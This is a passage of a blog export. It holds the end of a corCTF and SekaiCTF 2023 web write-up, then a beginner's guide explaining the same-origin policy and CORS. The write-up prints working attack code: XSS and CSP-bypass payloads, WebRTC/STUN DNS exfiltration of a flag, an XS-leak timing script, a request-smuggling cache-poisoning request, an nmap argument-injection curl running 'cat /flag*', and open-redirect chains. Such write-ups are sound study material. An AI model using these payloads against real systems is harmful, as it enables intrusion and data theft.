stroke=\"#004400\"/> &lt;foreignObject> &lt;iframe srcdoc=\"&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;\">&lt;/iframe> &lt;/foreignObject> &lt;/svg> Next, you need to bypass CSP. In this challenge, &lt;base&gt; is used to change the location of script loading. References: https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/ Renwa’s solution involves rebuilding the app inside an iframe and inserting a script using Next.js features: https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd youdirect (5 solves)This challenge is about finding an open redirect on YouTube. @EhhThing provided a solution (clicking will log you out) that involves two layers of open redirect: https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394 @pew provided:https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew @Josh provided:https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&amp;q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&amp;v=-5Rm9ymMTRA&amp;html_redirect=1 This one is special. In fact, each link in the YouTube video description generates a redirect link, but they are bound to session IDs on the webpage. Therefore, if you switch devices, you cannot use them. However, this link was generated on the mobile app, which may be because the mobile app does not have cookies and is not restricted. Interesting. crabspace (4 solves)The first step is to use tera’s SSTI to leak environment variables: &#123;&#123; get_env(name=\"SECRET\") &#125;&#125; Then, you can bypass CSP using WebRTC: &lt;script> async function a()&#123; c=&#123;iceServers:[&#123;urls:\"stun:&#123;&#123;user.id&#125;&#125;.x.cjxol.com:1337\"&#125;]&#125; (p=new RTCPeerConnection(c)).createDataChannel(\"d\") await p.setLocalDescription() &#125; a(); &lt;/script> With these two steps, you can forge an admin session and obtain the flag. References: corCTF 2023 web&#x2F;crabspace Writeup leakynote (3 solves)This challenge was solved during the competition. In simple terms, it provides a free HTML injection and a strict CSP: Content-Security-Policy &quot;script-src &#39;none&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;;&quot;; There is also a search API that returns 200 for success and 404 for failure. The goal is to find a way to leak the flag using this API. One of the key points of this challenge is that the CSP header is added by nginx, and nginx only adds the header for 2xx and 3xx responses. Therefore, if the search fails and returns 404, the page will not have a CSP. So, I came up with a cache probing method. We insert &lt;iframe src=search?q=a&gt; into the note. If nothing is found, there is no CSP, so the content of the iframe will be loaded, and the CSS on the page will also be loaded. On the other hand, because it violates the CSP, nothing will be loaded. Therefore, we can use the “whether CSS is cached” point to determine if the search found anything. At that time, the implemented code was as follows: &lt;script> const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)) async function clearCache() &#123; let controller = new AbortController(); let signal = controller.signal; fetch('https://leakynote.be.ax/assets/normalize.css',&#123; mode: \"no-cors\", signal: signal, cache: 'reload' &#125;) await sleep(0) controller.abort(); await sleep(100) &#125; async function testNote(title, url) &#123; // open note page var w = window.open(url) // wait 1s await sleep(1000) // clear cache and wait again await clearCache() await sleep(1500) // now the iframe should load, do cache probing const now = performance.now() await fetch('https://leakynote.be.ax/assets/normalize.css', &#123; mode: 'no-cors', cache: 'force-cache' &#125;) const end = performance.now() fetch(`/report?title=$&#123;title&#125;&amp;ms=$&#123;end-now&#125;`) if (end-now >= 4) &#123; fetch('/maybe/' + title) &#125; // cached(no result) => 2~3ms // no cache(found) => 4.8~5.8ms w.close() &#125; // copy paste the following from python script async function main() &#123; await testNote('&#123;a','https://leakynote.be.ax/post.php?id=c9193aee91b0fc29') await testNote('&#123;c','https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2') await testNote('&#123;d','https://leakynote.be.ax/post.php?id=0c6caa61575b9478') await testNote('&#123;e','https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be') await testNote('&#123;f','https://leakynote.be.ax/post.php?id=71652df64d54c0e4') await testNote('&#123;g','https://leakynote.be.ax/post.php?id=354f3bec25e02332') await testNote('&#123;k','https://leakynote.be.ax/post.php?id=066aa475493e1a4c') await testNote('&#123;l','https://leakynote.be.ax/post.php?id=54a12f7b11098d2a') await testNote('&#123;o','https://leakynote.be.ax/post.php?id=621591145bcfc8e0') await testNote('&#123;r','https://leakynote.be.ax/post.php?id=6b44725cb5e274f0') await testNote('&#123;t','https://leakynote.be.ax/post.php?id=e025b26e5e7117a1') await testNote('&#123;y','https://leakynote.be.ax/post.php?id=f10001d89230485e') await testNote('&#123;z','https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad') &#125; main() &lt;/script> After the competition, I saw two other interesting solutions. One of them leaks the information by loading fonts. When you do this: @font-face &#123; font-family: a; src: url(/time-before),url(/search.php?query=corctf&#123;a),url(/search.php?query=corctf&#123;a),... /*10000 times */,url(/time-after) &#125; Chrome determines how to handle it based on the status code. If it is 200, it checks if it is a valid font. If it is 404, it fails directly. Therefore, you can use the loading time of the font to determine the status code. ref: https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45 The other solution also utilizes the feature of whether the CSS file is loaded, but instead of using cache, it causes server-side busyness by opening a large number of pages at once and slows down the response time to determine. ref: https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09 pdf-pal (2 solves)The nginx config for this challenge looks like this: location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:7777; location ^~ &#x2F;generate &#123; allow 127.0.0.1; deny all; &#125; location ^~ &#x2F;rename &#123; allow 127.0.0.1; deny all; &#125; &#125; So, theoretically, accessing the /generate path should not be possible. However, you can bypass it by exploiting the difference between gunicorn and nginx parsers: POST &#x2F;generate&#123;chr(9)&#125;HTTP&#x2F;1.1&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1 Related ticket: https://github.com/benoitc/gunicorn/issues/2530 After bypassing, you can use the /generate function to generate a PDF. However, because this service blocks some keywords, it is not possible to directly convert the flag into a PDF. The solution is to use DNS rebinding to POST to http://localhost:7778 and retrieve the response. For example, if we have a domain example.com with two A records, one pointing to the actual IP and the other pointing to 0.0.0.0, when the admin bot visits http://example.com:7778/, it resolves the actual IP and successfully retrieves the page. At this point, we shut down the server and execute fetch(&#39;http://example.com:7778/generate&#39;). Since the original IP is no longer accessible, the browser will fallback to 0.0.0.0 and successfully send the request to the desired location. Because it is same-origin, we can also retrieve the response. For more details, please refer to: https://github.com/nccgroup/singularity https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves) lemon-csp (1 solve)Found a CSP bypass for 0-day, no public solution available. 0day (1 solve)This challenge involves finding a 1-day for VM2, no public solution available. SekaiCTF 2023The source code for the challenges is available here: https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web Scanner Service (146 solves)Input the port and host, and the following code will be executed: nmap -p #&#123;port&#125; #&#123;hostname&#125; However, the input data goes through a sanitizer with character restrictions. Tabs can be used, so you can use tabs to add parameters. During the competition, -iL /flag.txt -oN - was used to pass the challenge, redirecting the output to stdout, or using /dev/stdout is also valid. The official writeup suggests using the http-fetch script to download the file to the local machine, and then running nmap --script to execute that script: --script http-fetch -Pn --script-args http-fetch.destination&#x3D;&#123;DOWNLOAD_DIR&#125;,http-fetch.url&#x3D;&#123;NSE_SCRIPT&#125; --script&#x3D;&#123;DOWNLOAD_DIR&#125;&#x2F;&#123;LHOST&#125;&#x2F;&#123;LPORT&#125;&#x2F;&#123;NSE_SCRIPT&#125; In Discord, @zeosutt provided an interesting alternative solution that utilizes the technique of uploaded files being stored in /tmp/ on the rack server. You can directly import the uploaded file: curl http:&#x2F;&#x2F;35.231.135.130:32190&#x2F; -F $&#39;service&#x3D;127.0.0.1:1337\\t--script\\t&#x2F;tmp&#x2F;RackMultipart?????????????????&#39; -F &#39;&#x3D;os.execute(&quot;cat &#x2F;flag*&quot;);filename&#x3D;evil&#39; Frog-WAF (29 solves)There is an EL injection vulnerability in buildConstraintViolationWithTemplate, and the remaining challenge is to bypass the WAF. Similar vulnerabilities have been found in actual products: Expression Language Injection in Netflix Conductor CVE-2020-9296-Netflix-Conductor-RCE-Analysis For the bypassing part, you can refer to the following resources: https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00 Chunky (16 solves)This challenge involves a cache server and a backend server. All requests go through the cache server before reaching the backend, and a copy of the response is stored in the cache server as a cache. The goal is to poison the cache. The solution is to construct a request that is interpreted differently by the cache server and the backend server, similar to request smuggling. Here is the solution provided by zeyu: GET &#x2F;aaaaa HTTP&#x2F;1.1 Host: localhost transfer-encoding: chunked Content-Length: 102 0 GET &#x2F;post&#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP&#x2F;1.1 X: GET &#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;.well-known&#x2F;jwks.json HTTP&#x2F;1.1 Host: localhost The cache server interprets the second request as GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json based on the Content-Length header, while the backend server interprets it as GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 based on the transfer-encoding header. This way, we can use the response from another path to poison the jwks.json file and achieve cache poisoning. Golf Jail (16 solves)I have solved this challenge, which took me about a day. I found it very interesting, and the code is concise. &lt;?php header(\"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';\"); header(\"Cross-Origin-Opener-Policy: same-origin\"); $payload = \"🚩🚩🚩\"; if (isset($_GET[\"xss\"]) &amp;&amp; is_string($_GET[\"xss\"]) &amp;&amp; strlen($_GET[\"xss\"]) &lt;= 30) &#123; $payload = $_GET[\"xss\"]; &#125; $flag = \"SEKAI&#123;test_flag&#125;\"; if (isset($_COOKIE[\"flag\"]) &amp;&amp; is_string($_COOKIE[\"flag\"])) &#123; $flag = $_COOKIE[\"flag\"]; &#125; ?> &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe sandbox=\"allow-scripts\" srcdoc=\"&lt;!-- &lt;?php echo htmlspecialchars($flag) ?> -->&lt;div>&lt;?php echo htmlspecialchars($payload); ?>&lt;/div>\" >&lt;/iframe> &lt;/body> &lt;/html> You are given a 30-character free XSS payload, and the goal is to execute arbitrary code. The clever part here is the use of &lt;iframe srcdoc&gt; with sandbox=allow-scripts to create an environment where code can be executed, but the origin is null, and the CSP (Content Security Policy) inherits the execution environment from the parent. Therefore, you cannot access any information from the top, including name or location. After searching around, I found baseURI in the document, which I discovered inherits the value from the parent and contains the complete path. So, by using &lt;svg/onload=eval(&quot;&#39;&quot;+baseURI)&gt; along with a hash, we can execute arbitrary code within the 30-character limit. The reason we can use baseURI to access document.baseURI is that the scope of inline event handlers is automatically added to the document. I wrote about this in my blog post Discovering My Lack of Front-end Knowledge through Cybersecurity. Once we have XSS, we can use document.childNodes[0].nodeValue to retrieve the flag. The final challenge is how to exfiltrate the flag. The CSP in this challenge is strict, and we cannot use redirects or window.open (the challenge blocks navigation without using the new navigate-to directive, it’s impressive). So, we have to rely on some existing bypass techniques. I first tried DNS prefetch, but it didn’t work. I found out that Chrome released a feature called Resoure Hint “Least Restrictive” CSP in version 112, which might be the reason. But no worries, WebRTC is still useful. However, I couldn’t figure out how to use it even after trying for a long time. In the end, I found a payload in another team’s write-up on CTFtime and combined it with DNS: var flag = document.childNodes[0].nodeValue.trim() .replace(\"SEKAI&#123;\", \"\").replace(\"&#125;\", \"\") .split(\"\").map(c => c.charCodeAt(0)).join(\".\"); var p = new RTCPeerConnection(&#123; iceServers: [&#123; urls: \"stun:\" + flag + \".29e6037fd1.ipv6.1433.eu.org:1337\" &#125;] &#125;); p.createDataChannel(\"d\"); p.setLocalDescription() Leakless Note (4 solves)This is an advanced version of the previously mentioned “leakynote” challenge. This time, the CSP is stricter with the addition of default-src &#39;self&#39;, and there are no other CSS files on the page. The scenario is the same: there is an iframe that may or may not load, and the goal is to detect this. The solution provided by strellic is as follows: // leakless note oracle const oracle = async (w, href) => &#123; const runs = []; for (let i = 0; i &lt; 8; i++) &#123; const samples = []; for (let j = 0; j &lt; 600; j++) &#123; const b = new Uint8Array(1e6); const t = performance.now(); w.frames[0].postMessage(b, \"*\", [b.buffer]); samples.push(performance.now() - t); delete b; &#125; runs.push(samples.reduce((a,b)=>a+b, 0)); w.location = href; await sleep(500); // rate limit await waitFor(w); &#125; runs.sort((a,b) => a-b); return &#123; median: median(runs.slice(2, -2)), sum: runs.slice(2, -2).reduce((a,b)=>a+b,0), runs &#125; &#125; When you send a large message to the iframe, the time it takes will be different. Another team opened 1000 tabs and measured the network time. In hindsight, it seems quite reasonable. If the iframe has a status code of 200, it will generate a lot of requests, slowing down the network speed.","link":"/2023/09/02/en/corctf-sekaictf-2023-writeup/"},{"title":"CORS Complete Guide (Part 1): Why CORS Errors Occur?","text":"PrefaceThree years ago, I wrote an article: Easy Understanding of AJAX and Cross-Origin Requests, which mentioned API integration, AJAX, same-origin policy, JSONP, and CORS. At that time, I put everything I wanted to say into it, but looking back now, it seems that many important parts were not mentioned. Three years later, I am challenging this topic again and trying to express it more completely. The reason why I want to write this series is that CORS is a frequently asked topic in programming-related discussion forums, and both front-end and back-end developers may ask related questions. So I thought: “Okay, then I’ll write a series. I want to try to write this topic so that everyone who encounters CORS problems will come to see this series, and after reading it, they will know how to solve the problem.” This is my goal for this article. If the quality of the article cannot achieve this goal, I will continue to improve it. This series consists of six articles: CORS Complete Guide (Part 1): Why CORS Errors Occur? CORS Complete Guide (Part 2): How to Solve CORS Problems? CORS Complete Guide (Part 3): CORS Detailed Explanation CORS Complete Guide (Part 4): Let’s Look at the Specification Together CORS Complete Guide (Part 5): Security Issues of Cross-Origin Requests CORS Complete Guide (Part 6): Summary, Afterword, and Leftovers It will start from the same-origin policy, then talk about why there are errors when accessing resources across origins, and then talk about how to solve CORS-related problems correctly and incorrectly. The third article will explain in detail the detailed process of cross-origin requests, such as preflight requests. The basic part is enough to read the first three articles, and the following will be a bit deeper. The fourth article will take you to look at the spec together, proving that the previous articles were not nonsense, and the fifth article will show you cross-origin-related regulations such as CORB (Cross-Origin Read Blocking), COEP (Cross-Origin Embedder Policy), or COOP (Cross-Origin-Opener-Policy), and related security issues. The last article will be some scattered topics and thoughts. As the first article in the series, I want to take you to think about why there is a same-origin policy and why errors occur when accessing resources across origins. If you don’t know the answer to this question, then you usually don’t really understand what CORS is regulating, and it is likely that you will use some incorrect methods to solve this problem. In this article, I assume that you already have some basic concepts of cross-origin requests and CORS. If you have no idea at all, you can refer to this article I wrote before: Easy Understanding of AJAX and Cross-Origin Requests. Before starting, I want to tell you a little story related to the whole CORS, just treat it as a nonsense story. After understanding the whole cross-origin request-related things, you will know what this story represents. The protagonist of the story is a small capitalist who is eager to learn and wants to obtain various information. The government wants to monitor these eager learners and try to know what information they have asked for. Therefore, they placed him in a small room, and all communication with the outside world had to go through the guard at the door. So the small capitalist cannot go out in person, but he can ask the guard anything he wants to know. For each question asked by the small capitalist, the guard will help him ask the person concerned, but he may not tell him the answer. The government has established a procedure, which is “unless the person being asked explicitly agrees, the answer cannot be told to the small capitalist.” Therefore, the guard will first ask the question and get the answer, and then ask: “Do you want to let the small capitalist know about this?” Some people are willing, such as fast food restaurants. Although they don’t know the small capitalist at all, anyone can be told this kind of information. But some people are unwilling because they don’t know who the small capitalist is. There is also a situation where the guard doesn’t even need to ask, which is the small capitalist’s family. Because the small capitalist’s family is related by blood and has the same origin, they can be released without asking. So, although every question from Xiaozhi was conveyed to the person being asked, they might not receive a reply. One day, Xiaozhi couldn’t stand being imprisoned like this anymore, so he came up with a few methods. The first method was to knock down the guard and escape. Without the guard, he would be free to ask anyone any questions without any constraints. The second method was to ask a friend to act as a go-between. Whenever Xiaozhi had a question, he would tell the guard, “Ask my friend how much a Big Mac costs,” and then the friend would go ask the fast food restaurant and tell the guard the result, while also letting the guard know that he was willing to let Xiaozhi know about this. Because all the questions would be relayed through his friend, and his friend would always let the guard know that Xiaozhi could know this information, Xiaozhi would not have the previous limitation. The third method was to make everyone willing to tell him the information, so he would not be intercepted by the guard and could successfully find out the answers to his questions. Okay, the story is over. Although I don’t think it’s very relevant, exaggerated stories always attract more attention, so let’s leave it at that and move on to the topic. Starting from familiar error messagesI believe everyone is familiar with this error message: request has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. When using XMLHttpRequest or fetch in the frontend, you should have encountered this error. When connecting to the backend or an API on the internet, you can’t connect, and you don’t know where the problem is, and you may not even know if it’s a frontend or backend issue. Therefore, I will tell you the answer directly here: In most cases, CORS is not a frontend problem and cannot be solved purely by the frontend. In other words, when encountering this error, it is usually not your responsibility to solve the problem, but the backend’s. You can keep this sentence in mind, and you should agree with it after reading the article. Since the CORS error is caused by “cross-origin API calls,” two things must be clarified: What is cross-origin? Why can’t you make cross-origin API calls? What is cross-origin?The English term for cross-origin is “cross-origin,” which means that when you want to get something from source B from source A, it is cross-origin. And this source actually represents the “source of the request,” for example, if you send a request from https://huli.tw, then the origin of this request is https://huli.tw. And same origin means that the source is the same. If the origins of two URLs A and B are the same, we say that A and B are the same origin, also known as “the same source.” So https://huli.tw and https://google.com are not the same origin because their origins are different. To be more precise, you can treat the origin as a combination of scheme + host + port. The scheme is the https or http at the beginning, the host is huli.tw, and if the port is not specified, the default port for http is 80, and for https it is 443. So, https://huli.tw and https://huli.tw/api are the same origin because the scheme + host + port are the same (/api is the path, not the host). https://huli.tw and http://huli.tw are not the same origin because the scheme is different. http://huli.tw and http://huli.tw:3000 are not the same origin because the port is different. https://api.huli.tw and https://data.huli.tw are not the same origin because the host is different. https://huli.tw and https://api.huli.tw are not the same origin because the host is different. The fifth point is something you need to pay special attention to. Domains and subdomains are also not the same origin, so api.huli.tw and huli.tw are not the same origin. Many people often confuse this with cookies because api.huli.tw and huli.tw can share cookies. Here, I want to emphasize that the cookie matching rule is called Domain Matching, which looks at the domain, not the origin we defined here. Don’t get confused. From the above examples, it can be seen that achieving the same origin is quite difficult. If you only look at the URL, it basically has to look exactly the same, and only the path and the following parts can be different. For example, https://huli.tw/a/b/c/index.html?a=1 and https://huli.tw/show/cool/b.html are both under the same scheme + host + port, and their origin will be https://huli.tw, so these two URLs are the same origin. In practice, it is quite common to represent the front-end website and API with different domains. For example, huli.tw is the front-end website, and api.huli.tw is the back-end API. Therefore, it is also common to encounter cross-origin request scenarios in practice. (By the way, if you want to avoid cross-origin, you will put the front-end and back-end in the same origin. For example, huli.tw/api is the back-end API, and other paths are the front-end website.) Why can’t APIs be called across domains?After understanding the definition of the same origin, we can look at another question: “Why can’t APIs be called across domains?” But in fact, this definition is a bit unclear. More precisely, it is: “Why can’t XMLHttpRequest or fetch (or simply called AJAX) be used to obtain resources across domains?” I specifically mention this more precise definition because it is very common to obtain “resources across domains”, such as &lt;img src=&quot;https://another-domain.com/bg.png&quot; /&gt;, which is actually used to obtain resources across domains, but we are only fetching images here. Or: &lt;script src=&quot;https://another-domain.com/script.js&quot; /&gt;, this is also a cross-origin request, fetching a JS file and executing it. But have you encountered any problems with these two situations? Basically, you haven’t, and you are already used to it, without thinking that there may be problems. So why is it different when it becomes AJAX, when it becomes XMLHttpRequest or fetch? Why are cross-origin requests blocked at this time? (This statement is actually not very accurate and will be explained in detail later) To understand this issue, you actually need to think the other way around. Because you already know that the “result” will be blocked, since the result is like this, there must be a reason for it, but what is the reason? This is a bit like the method of proof by contradiction. If you want to prove something A, you first assume that A is wrong, and then find a counterexample to find a contradiction, and you can prove that A is correct. You can adopt a similar strategy when thinking about technical issues like this. You first assume that “blocking cross-origin requests” is wrong and meaningless, and then if you find a contradiction, you will find that it is necessary to block cross-origin requests. Therefore, you can think about the following question: What will happen if cross-origin requests are not blocked? Then I can freely connect to the API without having to google for CORS solutions! It sounds like there is no problem. Why can both img and script tags be used, but AJAX cannot? If cross-origin AJAX is not blocked, then I can use AJAX to get data from https://google.com on my website (assuming it is https://huli.tw/index.html), right? It seems that there is no problem, it’s just getting the HTML of Google’s homepage, nothing serious. But if I happen to know that your company has an “internal” public website, the address is http://internal.good-company.com, which cannot be accessed externally, only the company’s employees’ computers can access it, and then I write a AJAX to get its data on my website, can I get the website content? Can I return it to my server after getting it? This raises security issues because attackers can obtain some confidential information. The target opens a malicious website The malicious website uses AJAX to fetch data from the internal confidential website Get the data Return to the attacker’s server You may ask: “But to use this trick, the attacker also needs to know what the URL of your internal website is, isn’t it too difficult?” If you think this is too difficult, then I will give you another example. I ask you a question. When you are developing, do you usually start a server on your computer, and the URL may be http://localhost:3000 or http://localhost:5566? In terms of modern front-end development, this is very common. If the browser does not block cross-origin APIs, then I can write a piece of code like this: function sendRequest(url, callback) &#123; const request = new XMLHttpRequest(); request.open('GET', url, true); request.onload = function() &#123; callback(this.response); &#125; request.send(); &#125; for (let port = 80; port &lt; 10000; port++) &#123; sendRequest('http://localhost:' + port, data => &#123; &#125;) &#125; In this way, as long as you have a server running on localhost, I can get your content and know what you are developing. In work, this may be company secrets, or attackers can find vulnerabilities by analyzing these websites and then use similar methods to break in. Furthermore, if you think the above two tricks are not feasible, we have another assumption here. In addition to assuming that cross-origin requests are not blocked, we also assume that “cross-origin requests will automatically attach cookies”. So if I send a request to https://www.facebook.com/messages/t, I can see your chat messages, and if I send a request to https://mail.google.com/mail/u/0/, I can see your private emails. By this point, you should understand why cross-origin AJAX needs to be blocked: Security In the browser, if you want to get the complete content of a website (which can be fully read), basically you can only use XMLHttpRequest or fetch. If these cross-origin AJAXs are not restricted, you can use the user’s browser to get the content of “any website”, including various websites that may have sensitive information. Therefore, it is reasonable for browsers to block cross-origin AJAX requests for security reasons. At this point, some people may have a question: “Why are images, CSS, or scripts not blocked?” Because these are more like “part of the web resources”. For example, if I want to use someone else’s image, I use &lt;img&gt; to import it, and if I want to use CSS, I use &lt;link href=&quot;...&quot;&gt;. These tags have restrictions on the resources that can be obtained. Moreover, the resources obtained cannot be read by programs, which is important. After I load the image, it is just an image. Only the browser knows the content of the image, and I don’t know it. I also cannot read it with a program. Since I cannot read it with a program, I cannot pass the obtained result to other places, so there will be less data leakage problems. To correctly understand cross-origin requests, the first step is to understand “why browsers block them”, and the second step is to have a correct understanding of “how they are blocked”. Below, I have prepared two small quizzes for everyone to try to answer. In-class quizQuestion 1Xiao Ming is responsible for a project, and the URL is: https://best-landing-page.tw. This website will need to use a file from another company website, which contains some user data, and the URL is: https://lidemy.com/users.json. Xiao Ming directly clicked on this URL and found that he could see the contents of the file with the browser, so he said: Since I can see the content with the browser, it means that the browser can open it, so I can definitely get the data with AJAX! Let’s use AJAX to get the data! Is Xiao Ming’s statement correct? If it is incorrect, please point out the error. Question 2Xiao Ming is working on a project that needs to connect to an API, and there is an API within the company that is used to delete articles. Just pass the article ID over with POST in application/x-www-form-urlencoded content type to delete it. For example: POST https://lidemy.com/deletePost and bring id&#x3D;13, then the article with id 13 will be deleted (the backend does not perform any permission checks). The domain of the company’s front-end and back-end is different, and the back-end has not added the CORS header. Therefore, Xiao Ming believes that the front-end will be restricted by the same-origin policy when using AJAX, and the request cannot be sent out at all. After calling it, the console does show the error “request has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource”. So Xiao Ming believes that the front-end cannot use AJAX to call this API to delete articles, and the articles cannot be deleted. Is Xiao Ming’s statement correct? If it is incorrect, please point out the error. How is your cross-origin AJAX blocked?The above two questions are conceptual questions, and you can easily answer them if you have the correct concepts. Novices, especially those who have only dealt with JS on browsers, usually have incorrect concepts (which is normal), and the most common misconception is the wrong understanding of the same-origin policy or “cross-origin requests”. First of all, the first important concept is: “You are writing programs on the browser”. What does this mean? It means that the many restrictions you encounter when writing JavaScript are imposed by the browser, not by the programming language itself. Those things you can’t do are blocked by the browser. JavaScript is a programming language, so things like var, if else, for, function, etc. are all part of JavaScript. But JavaScript needs a place to run, and this place is called the runtime environment, and the most commonly used one is: the browser. So when you write JavaScript, you are running it on the browser, and this runtime environment provides you with some things to use, such as DOM (document), console.log, setTimeout, XMLHttpRequest, or fetch. These are not part of JavsScript (or more precisely, ECMAScript). These are provided to us by the browser, so we can only use them when running JavaScript on the browser. Therefore, you may have had a similar experience, thinking about why the same code cannot be executed in Node.js. Now you know that it is because Node.js does not provide these things, such as fetch, you cannot use it directly in Node.js (if you can, it means you are using other libraries or polyfills). Conversely, when you execute JavaScript with Node.js, you can use process or fs, but you cannot use them in the browser. Different runtime environments provide different things, and you need to be very clear about where you are now. Sometimes, different runtime environments will also provide the same things, such as console.log and setTimeout, which are available in both the browser and Node.js. But even though they look the same, the internal implementation is completely different, and the behavior may also be different. For example, the browser’s console.log will output to the console of devtool, while Node.js will output to your terminal. The implementation of setTimeout in both is also different, so there may be differences in details. Returning to the topic, when we want to use AJAX to access a cross-origin resource on the browser, we are blocked. Who is blocking us? The browser. In other words, if we are not using a browser, if we are not running the program on a browser, then there is no same-origin policy, and we don’t have to worry about CORS. For example, if you join the army today, you have to fold tofu in the morning, shout “Dear Loyalty” when you enter the restaurant for lunch, greet your superiors, and start your speech with the word “Report”. Why? Because that’s how it’s regulated in the military. But if you retire from the army today, you are free, and you don’t have to do those things anymore. The browser is like a military camp, it is a limiter with many rules, and once you leave it, there are no rules. If you understand what I’m talking about, you probably know why a proxy can solve the CORS problem. It is because it retrieves data through the backend, not through the browser (which will be explained in detail later). When the browser opens a webpage, there are no same-origin policy rules. You can open any webpage you want, and the browser won’t stop you. So the answer to the first question of the quiz is: “Xiao Ming’s statement is incorrect. The fact that you can open a file with a browser doesn’t mean anything, and it has nothing to do with CORS. Browsing a website with a browser and using AJAX to retrieve data are two completely different things.” After solving the first question, let’s look at the second question. The gist of it is that Xiao Ming received a CORS error after sending a request, so he said that the request was blocked. The concept being tested in the second question is: What does it mean when a cross-origin request is blocked by the browser? How is it blocked? This question is included because many people believe that “the blocked cross-origin request is the request,” so in Xiao Ming’s example, the request was blocked by the browser, and it couldn’t reach the server, so the data couldn’t be deleted. However, this statement is problematic if you think about it. You can tell from the error message: request has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource The browser says that the header doesn’t exist, what does that mean? It means that it has sent out the request, and it knows that the Access-Control-Allow-Origin header doesn’t exist only after receiving the response. So the browser is not blocking the request, but the response. Your request has already reached the server, and the server has returned a response, but the browser just doesn’t give you the result. Therefore, the answer to the second question is that although Xiao Ming saw this CORS error, the article was actually deleted because the request had been sent to the server, but Xiao Ming couldn’t get the response. Yes, the article was deleted, really. Finally, let me add one more concept. Earlier, I mentioned that CORS is blocked for security reasons. If it is not blocked, attackers can use AJAX to retrieve non-public data from the intranet, and company secrets will be leaked. And here I say “there is no CORS problem once you leave the browser,” which means that even if CORS is blocked, can’t I send a request to the same website myself? Does that mean there is no security issue? For example, if I use curl or Postman or any tool, I should be able to bypass CORS, right? People who think this way overlook a fundamental difference between the two. Suppose our target is a company’s intranet, and the URL is: http://internal.good-company.com If I send a request directly from my computer using curl, I will only get an error because I don’t have permission since I am not in the company’s intranet. I may not even be able to connect to this domain because only the intranet can resolve it. CORS is: “I created a website for intranet users to access and send requests to retrieve data.” The biggest difference between these two is “who is visiting the website from whose computer.” The former is me, and the latter is someone else (and someone who can connect to the intranet). As shown in the figure, the upper part is when the attacker tries to connect to that URL by himself, he cannot connect because the target is in the intranet. So even if there is no same-origin policy, the attacker still cannot get what he wants. The lower part is when the attacker creates a malicious website and tries to get users to visit it, such as at point 1. After the user visits the website, it follows the process at point 2, sends a request to the target (internal server) using AJAX at point 3, retrieves the data, and returns it to the attacker at point 4. With the protection of same-origin policy, step 4 will not be executed because JS cannot get the result of the fetch, so it won’t know what the response is. SummaryThis article mainly discusses why browsers block certain requests and how they do it. It also highlights several common misconceptions that beginners often have. Here are the key points: Browsers block cross-origin requests for security reasons. With AJAX, you can directly access the entire response, so not blocking it would be problematic. However, with elements like the img tag, you cannot access the response, so it is less of an issue. Same-origin policy and CORS exist because we are “writing JS in the browser,” so we are subject to the limitations of the execution environment. If we were writing in Node.js, we would not have these issues and could access whatever we want without being blocked. In the browser, CORS restrictions actually apply to “not being able to access the response,” not “not being able to send the request.” The request has already been sent and the browser has received the response, but it does not give it to you for security reasons. (This statement is not entirely accurate, as there are simple and non-simple requests, which will be discussed in the third article.) After clarifying these important concepts, we can move on to our next article: CORS Complete Guide (Part 2): How to Solve CORS Issues?.","link":"/2021/02/19/en/cors-guide-1/"},{"title":"CORS Complete Guide (Part 3): CORS in Detail","text":"IntroductionIn the previous article, we mentioned the common solutions to CORS errors and the solution that should be chosen in most cases: “Ask the backend to add response headers.” However, “cross-origin requests” can actually be further divided into two types: simple requests and non-simple requests. Simple requests can be solved using the solution in the previous article, but non-simple requests are more complicated. In addition, cross-origin requests do not send cookies by default, and an additional setting is required when using xhr or fetch, and the backend also needs to add an additional header. There are actually many headers related to CORS, some of which you may not have heard of. Originally, I wanted to list these things one by one and explain them, but after careful consideration, I felt that this would be a bit boring, and everyone would probably forget after reading it. So what would be a better way? Everyone likes to hear stories, so in this article, let’s start from the perspective of a story and tell you a story about love and CORS. The protagonist’s name is well known, yes, it’s the unoriginal Xiaoming. Day 1: Simple CORSXiaoming works for a technology company as a rookie front-end engineer. And his first task is to 